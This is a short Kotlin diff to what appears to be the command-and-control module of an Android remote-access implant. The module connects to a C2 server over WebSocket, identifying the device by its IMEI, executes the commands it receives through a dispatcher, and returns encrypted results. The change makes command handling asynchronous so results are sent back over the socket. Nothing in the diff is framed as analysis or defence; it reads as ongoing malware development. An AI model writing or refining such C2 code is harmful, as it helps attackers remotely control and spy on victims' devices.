@@ -33,13 +33,17 @@ object C2Coordinator {
         ws = WebSocketTransport(
             serverUrl = serverUrl,
             onCommand = { cmd ->
-                runBlocking {
+                // NON-BLOCKING: dispatch coroutine on IO scope, send result when ready.
+                // Avoids runBlocking which starves the OkHttp WebSocket callback thread.
+                scope.launch {
                     val raw = CommandDispatcher.dispatch(
                         Json { ignoreUnknownKeys = true }
                             .encodeToString(Command.serializer(), cmd)
                     )
-                    CryptoEngine.encrypt(raw)
+                    ws?.send(CryptoEngine.encrypt(raw))
                 }
+                // Return empty placeholder immediately — real result sent async.
+                CryptoEngine.encrypt("")
             },
             onStatus = { status -> Log.d(TAG, "WS: $status") }
         ).also { it.connect(imei) }
